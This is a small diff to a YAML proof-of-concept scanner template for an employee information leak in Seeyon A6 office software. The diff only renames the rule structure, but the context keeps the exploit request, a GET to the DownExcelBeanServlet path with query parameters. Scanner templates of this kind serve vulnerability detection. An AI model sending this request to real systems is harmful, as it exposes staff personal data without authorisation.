@@ -1,5 +1,6 @@
 name: poc-yaml-seeyon-a6-employee-info-leak
-rules:
+groups:
+  poc1:
     - method: GET
       path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
       expression:
